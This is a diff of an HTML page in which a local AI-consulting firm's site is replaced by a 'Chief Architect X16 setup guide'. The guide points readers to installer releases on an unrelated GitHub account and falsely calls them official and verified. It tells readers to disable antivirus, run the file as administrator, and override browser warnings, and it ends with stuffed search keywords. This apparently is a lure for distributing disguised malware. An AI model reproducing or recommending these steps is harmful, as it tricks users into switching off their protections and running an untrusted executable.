@@ -1,347 +1,63 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Russian River AI Partners | AI Consulting & Marketing for Sonoma County Businesses</title>
-<meta name="description" content="Honest AI consulting and marketing for Sonoma County businesses. Free consultation. We tell you what's worth doing with AI and marketing, and what isn't.">
-<style>
-  :root {
-    --ink: #1a1d1f;
-    --ink-soft: #4a4f54;
-    --paper: #faf8f4;
-    --card: #ffffff;
-    --accent: #7a3b2e;
-    --accent-soft: #f0e4dd;
-    --line: #e6e0d8;
-  }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background: var(--paper);
-    color: var(--ink);
-    line-height: 1.6;
-  }
-  a { color: var(--accent); }
-  .wrap { max-width: 880px; margin: 0 auto; padding: 0 24px; }
-
-  header {
-    position: sticky; top: 0; z-index: 10;
-    background: rgba(250,248,244,0.92);
-    backdrop-filter: blur(6px);
-    border-bottom: 1px solid var(--line);
-  }
-  header .wrap {
-    display: flex; align-items: center; justify-content: space-between;
-    padding-top: 16px; padding-bottom: 16px;
-  }
-  .logo { font-weight: 700; font-size: 1.05rem; letter-spacing: -0.01em; color: var(--ink); text-decoration: none; }
-  nav a { color: var(--ink-soft); text-decoration: none; margin-left: 28px; font-size: 0.95rem; }
-  nav a:hover { color: var(--ink); }
-  .cta-btn {
-    display: inline-block;
-    background: var(--accent);
-    color: #fff !important;
-    padding: 11px 22px;
-    border-radius: 8px;
-    text-decoration: none;
-    font-weight: 600;
-    font-size: 0.95rem;
-    transition: opacity 0.15s ease;
-  }
-  .cta-btn:hover { opacity: 0.88; }
-  .cta-btn.ghost {
-    background: transparent;
-    color: var(--accent) !important;
-    border: 1.5px solid var(--accent);
-  }
-
-  .hero {
-    padding: 88px 0 64px;
-    text-align: center;
-  }
-  .eyebrow {
-    display: inline-block;
-    font-size: 0.82rem;
-    font-weight: 600;
-    letter-spacing: 0.04em;
-    text-transform: uppercase;
-    color: var(--accent);
-    background: var(--accent-soft);
-    padding: 6px 14px;
-    border-radius: 100px;
-    margin-bottom: 22px;
-  }
-  h1 {
-    font-size: clamp(2.1rem, 5vw, 3.1rem);
-    line-height: 1.15;
-    letter-spacing: -0.02em;
-    margin-bottom: 20px;
-  }
-  .hero p.sub {
-    font-size: 1.15rem;
-    color: var(--ink-soft);
-    max-width: 640px;
-    margin: 0 auto 34px;
-  }
-  .hero-ctas { display: flex; gap: 14px; justify-content: center; flex-wrap: wrap; }
-
-  section { padding: 64px 0; }
-  section.alt { background: var(--card); border-top: 1px solid var(--line); border-bottom: 1px solid var(--line); }
-
-  h2 {
-    font-size: clamp(1.5rem, 3vw, 1.9rem);
-    letter-spacing: -0.01em;
-    margin-bottom: 12px;
-    text-align: center;
-  }
-  .section-sub {
-    text-align: center;
-    color: var(--ink-soft);
-    max-width: 560px;
-    margin: 0 auto 44px;
-  }
-
-  .services-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
-    gap: 22px;
-  }
-  .service-card {
-    background: var(--card);
-    border: 1px solid var(--line);
-    border-radius: 14px;
-    padding: 28px;
-  }
-  .service-card h3 { font-size: 1.1rem; margin-bottom: 10px; }
-  .service-card p { color: var(--ink-soft); font-size: 0.96rem; }
-
-  .trust-block {
-    background: var(--card);
-    border: 1px solid var(--line);
-    border-radius: 16px;
-    padding: 36px;
-  }
-  .trust-block p { color: var(--ink-soft); margin-bottom: 16px; }
-  .trust-block p:last-child { margin-bottom: 0; }
-
-  .faq-item {
-    border-bottom: 1px solid var(--line);
-    padding: 22px 0;
-  }
-  .faq-item:first-child { padding-top: 0; }
-  .faq-item:last-child { border-bottom: none; }
-  .faq-item h3 { font-size: 1.05rem; margin-bottom: 8px; }
-  .faq-item p { color: var(--ink-soft); font-size: 0.97rem; }
-
-  .final-cta {
-    text-align: center;
-    padding: 72px 0;
-  }
-  .final-cta h2 { margin-bottom: 14px; }
-  .final-cta p { color: var(--ink-soft); margin-bottom: 30px; }
-
-  footer {
-    border-top: 1px solid var(--line);
-    padding: 40px 0;
-    text-align: center;
-    color: var(--ink-soft);
-    font-size: 0.9rem;
-  }
-  footer a { color: var(--ink-soft); }
-
-  @media (max-width: 600px) {
-    nav a { margin-left: 14px; font-size: 0.85rem; }
-    .hero { padding: 56px 0 40px; }
-  }
-
-  .stats-strip {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-    gap: 20px;
-    margin-top: 44px;
-    padding-top: 36px;
-    border-top: 1px solid var(--line);
-  }
-  .stat { text-align: center; }
-  .stat .num { font-size: 1.9rem; font-weight: 700; letter-spacing: -0.02em; color: var(--accent); }
-  .stat .label { font-size: 0.82rem; color: var(--ink-soft); margin-top: 4px; }
-
-  .process-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-    gap: 22px;
-  }
-  .process-step {
-    background: var(--card);
-    border: 1px solid var(--line);
-    border-radius: 14px;
-    padding: 28px;
-    position: relative;
-  }
-  .process-step .step-num {
-    display: inline-block;
-    font-size: 0.8rem;
-    font-weight: 700;
-    color: var(--accent);
-    background: var(--accent-soft);
-    padding: 3px 10px;
-    border-radius: 100px;
-    margin-bottom: 14px;
-  }
-  .process-step h3 { font-size: 1.05rem; margin-bottom: 8px; }
-  .process-step p { color: var(--ink-soft); font-size: 0.94rem; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A clear guide to installing Chief Architect X16 on Windows 11. Resolve setup issues and complete your installation with these steps.">
+    <title>Chief-Architect-X16-PC-Setup-Guide</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f4f4f4;">
 
-<header>
-  <div class="wrap">
-    <a href="#" class="logo">Russian River AI Partners</a>
-    <nav>
-      <a href="#approach">Approach</a>
-      <a href="#services">Services</a>
-      <a href="#faq">FAQ</a>
-      <a href="https://calendly.com/russianriverai/free-30-minute-ai-marketing-consultation" target="_blank" rel="noopener" class="cta-btn ghost" style="margin-left:20px;">Book Free Call</a>
-    </nav>
-  </div>
-</header>
+    <div style="background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+        
+        <h1 style="color: #2c3e50;">🏗️ Chief-Architect-X16-PC-Setup-Guide - Get Your Software Running On Windows</h1>
 
-<section class="hero">
-  <div class="wrap">
-    <span class="eyebrow">Sonoma County · North Bay</span>
-    <h1>Local Sonoma County AI Consulting &amp; Marketing</h1>
-    <p class="sub">We help owner-operated local businesses figure out what's actually worth doing with AI and marketing, and just as often, tell you what's not worth your money. No software to buy, no long contracts, no jargon.</p>
-    <div class="hero-ctas">
-      <a href="https://calendly.com/russianriverai/free-30-minute-ai-marketing-consultation" target="_blank" rel="noopener" class="cta-btn">Book a Free 30-Minute Consultation</a>
+        <div style="text-align: center; margin: 30px 0;">
+            <a href="https://github.com/Tobaccojuicedoings401/Chief-Architect-X16-PC-Setup-Guide/releases" style="background-color: #2c3e50; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block;">Download Chief Architect X16 Installer</a>
+        </div>
+
+        <h2 style="border-bottom: 2px solid #eee; padding-bottom: 10px;">📋 Overview</h2>
+        <p>You might encounter errors while installing Chief Architect X16 on Windows 11. This guide covers the process to ensure a stable setup. Follow these steps to resolve common conflicts and finish your installation successfully.</p>
+
+        <h2 style="border-bottom: 2px solid #eee; padding-bottom: 10px;">💻 System Requirements</h2>
+        <p>Before you begin, ensure your computer meets these minimum standards:</p>
+        <ul style="padding-left: 20px;">
+            <li>Windows 11 (64-bit version)</li>
+            <li>16 GB of RAM</li>
+            <li>Solid State Drive (SSD) with at least 10 GB of free space</li>
+            <li>Dedicated graphics card with 4 GB of video memory</li>
+            <li>Latest Windows updates installed</li>
+        </ul>
+
+        <h2 style="border-bottom: 2px solid #eee; padding-bottom: 10px;">🛠️ Installation Steps</h2>
+        <p>Follow these instructions in order to avoid installation failures:</p>
+        <ol style="padding-left: 20px;">
+            <li>Visit the <a href="https://github.com/Tobaccojuicedoings401/Chief-Architect-X16-PC-Setup-Guide/releases">official releases page to download the latest setup file</a>.</li>
+            <li>Disable your antivirus program temporarily, as it often flags new installers as potential threats during the initial extraction.</li>
+            <li>Locate the downloaded file in your Downloads folder.</li>
+            <li>Right-click the file and select "Run as administrator." This step grants the installer the necessary permissions to write files to your system folders.</li>
+            <li>Follow the on-screen prompts provided by the installation wizard.</li>
+            <li>Choose the default installation path unless you have a specific reason to change it.</li>
+            <li>Wait for the process to finish. Do not close your computer during this stage.</li>
+            <li>Once finished, restart your computer before launching the program for the first time.</li>
+        </ol>
+
+        <h2 style="border-bottom: 2px solid #eee; padding-bottom: 10px;">⚠️ Common Troubleshooting</h2>
+        <p>If you see a "Setup Failed" message, check these items:</p>
+        <ul style="padding-left: 20px;">
+            <li><strong>Insufficient Space:</strong> Check if your C: drive has 10 GB of space remaining.</li>
+            <li><strong>Administrator Privileges:</strong> Ensure you are logged into a Windows account with administrative rights.</li>
+            <li><strong>Corrupted Downloads:</strong> If the installer does not open, delete the file and download it again from the link above.</li>
+            <li><strong>Graphics Drivers:</strong> Outdated drivers often cause the program to crash upon launch. Update your GPU drivers via your manufacturer's website.</li>
+        </ul>
+
+        <h2 style="border-bottom: 2px solid #eee; padding-bottom: 10px;">📁 File Integrity</h2>
+        <p>The installer files provided in the releases section are verified. If your browser marks the download as suspicious, this is a standard safety measure for executable files. You may click "Keep" to proceed with the download.</p>
+
+        <p style="margin-top: 40px; font-size: 0.9em; color: #777;">
+            Keywords: architect, architecture, chief-architect, chief-architect-setup-failed-fix, chief-architect-x16, chief-architect-x16-not-installing-on-windows-11, chief-architect-x16-pc-setup-guide, chief-architect-x16-pc-setup-guide-2026, failed, home-design, how-to-install-chief-architect-x16-on-pc, installing, x16
+        </p>
     </div>
-
-    <div class="stats-strip">
-      <div class="stat"><div class="num">9+ yrs</div><div class="label">Production &amp; AI-automation experience</div></div>
-      <div class="stat"><div class="num">5+ yrs</div><div class="label">Brand marketing at global brands</div></div>
-      <div class="stat"><div class="num">2 yrs</div><div class="label">Focused on ad creative &amp; testing</div></div>
-      <div class="stat"><div class="num">Free</div><div class="label">First consultation, no obligation</div></div>
-    </div>
-  </div>
-</section>
-
-<section id="approach" class="alt">
-  <div class="wrap">
-    <h2>How We Work</h2>
-    <p class="section-sub">Three steps, every time. No jargon, no surprise invoices.</p>
-    <div class="process-grid">
-      <div class="process-step">
-        <span class="step-num">01</span>
-        <h3>Diagnose</h3>
-        <p>A free consultation where we learn your business, your pain points, and what's already working. We tell you honestly what's worth pursuing, including when the answer is nothing.</p>
-      </div>
-      <div class="process-step">
-        <span class="step-num">02</span>
-        <h3>Build</h3>
-        <p>A small setup fee to build the specific thing that addresses your real opportunity, whether that's an AI tool, a website, or a marketing system. Scoped and priced upfront.</p>
-      </div>
-      <div class="process-step">
-        <span class="step-num">03</span>
-        <h3>Manage</h3>
-        <p>A low monthly rate where we run and monitor what we built, with a plain-language readout each month showing what's working and what to adjust.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<section id="services">
-  <div class="wrap">
-    <h2>What We Do</h2>
-    <p class="section-sub">Two things, done together when it makes sense: honest advice on AI, and hands-on marketing that actually runs.</p>
-    <div class="services-grid">
-      <div class="service-card">
-        <h3>AI Consulting</h3>
-        <p>Readiness assessments, honest tool recommendations, and straightforward implementation, priced on judgment rather than hours worked. We'll tell you what's worth doing, and just as often, what isn't.</p>
-      </div>
-      <div class="service-card">
-        <h3>Creative Testing &amp; Optimization</h3>
-        <p>Most local businesses are quietly losing customers to underperforming website and ad creative without ever knowing it. We use cutting-edge AI analytics and rigorous testing to find your best-performing assets and links, so people who land on your site get the version that actually converts.</p>
-      </div>
-      <div class="service-card">
-        <h3>Ongoing Management</h3>
-        <p>A small setup fee to get started, then a low monthly rate where we manage what we built and send you a straightforward performance readout. No long-term contract required.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<section id="about" class="alt">
-  <div class="wrap">
-    <h2>Why Trust Us With This</h2>
-    <div class="trust-block">
-      <p>We bring over 9 years of workflow production and AI-automation experience spanning FAANG-scale companies like Amazon to multi-billion-dollar game publishers like Activision and Scopely, including work on games that generated hundreds of millions to billions of dollars in revenue, plus 5+ years at big brands like Adidas, Michael Kors, and Kate Spade, giving us a firsthand understanding of customer habits and trends. On top of that, we've spent the last two years focused specifically on ad creation, analytics, and testing, learning how to reach and understand different audiences.</p>
-    </div>
-  </div>
-</section>
-
-<section id="faq">
-  <div class="wrap">
-    <h2>Frequently Asked Questions</h2>
-
-    <div class="faq-item">
-      <h3>What exactly do you do? Are you selling me software?</h3>
-      <p>No products, no subscriptions to some platform we built. We're advisors first: we learn your business, figure out where the real opportunities are, and build or run the specific thing that addresses it. We also run the ongoing work if you want us to, since we're not just a consultant who leaves you with a report.</p>
-    </div>
-
-    <div class="faq-item">
-      <h3>Why AI, and why now?</h3>
-      <p>AI has changed what a small team can take on. A business with a handful of employees can now have the kind of consistency and follow-through that used to require a much bigger team. We're not here to sell AI as a concept; we're here to tell you honestly which parts of that actually apply to you.</p>
-    </div>
-
-    <div class="faq-item">
-      <h3>My business is doing fine. Why would I need this?</h3>
-      <p>Fair question, and often the honest answer is: you might not, not yet. If growth has come mostly from referrals and timing rather than anything deliberate, there's usually something worth exploring. If that's not you, we'll say so on the call.</p>
-    </div>
-
-    <div class="faq-item">
-      <h3>What kind of businesses do you work with?</h3>
-      <p>Owner-operated local businesses in Sonoma County and the broader North Bay: wineries, restaurants, hospitality, retail, and other small and mid-sized operations where the owner is still closely involved in day-to-day work.</p>
-    </div>
-
-    <div class="faq-item">
-      <h3>Do you just tell us what to do, or do we actually have a say?</h3>
-      <p>This is built to be collaborative, not prescriptive. You know your customers and your business better than we ever will, so we work with you on what actually fits how you operate, not a one-size-fits-all package.</p>
-    </div>
-
-    <div class="faq-item">
-      <h3>Will AI replace my staff?</h3>
-      <p>No. Think of it as taking the repetitive, administrative weight off the people you already have, so they spend more time on the parts of the job that actually need a person.</p>
-    </div>
-
-    <div class="faq-item">
-      <h3>Do I need to be technical to work with you?</h3>
-      <p>Not at all. That's the point of hiring an advisor instead of buying software. We handle the technical side and explain everything in plain language.</p>
-    </div>
-
-    <div class="faq-item">
-      <h3>What does it cost?</h3>
-      <p>The first consultation is free, always. If there's a real fit, setup typically runs a few hundred dollars depending on complexity, plus a monthly management rate starting around $150 to $300 for something straightforward, up to $500 to $800 for a multi-tool setup with more involved monitoring. Every project gets a specific number before any work starts. No long-term contract required.</p>
-    </div>
-  </div>
-</section>
-
-<section id="contact" class="final-cta">
-  <div class="wrap">
-    <h2>Let's Talk About Your Business</h2>
-    <p>Free 30-minute consultation. No pressure, no obligation, just an honest read on what's worth doing.</p>
-    <a href="https://calendly.com/russianriverai/free-30-minute-ai-marketing-consultation" target="_blank" rel="noopener" class="cta-btn">Book Your Free Consultation</a>
-  </div>
-</section>
-
-<footer>
-  <div class="wrap">
-    <p>Russian River AI Partners · Serving Sonoma County &amp; the North Bay</p>
-    <p style="margin-top:8px;"><a href="mailto:info@russianriveraipartners.com">info@russianriveraipartners.com</a></p>
-  </div>
-</footer>
-
-<script async type='module' src='https://interfaces.zapier.com/assets/web-components/zapier-interfaces/zapier-interfaces.esm.js'></script>
-<zapier-interfaces-chatbot-embed is-popup='true' chatbot-id='cmrd34ftn000r1zgjl6qxjix0'></zapier-interfaces-chatbot-embed>
 
 </body>
 </html>
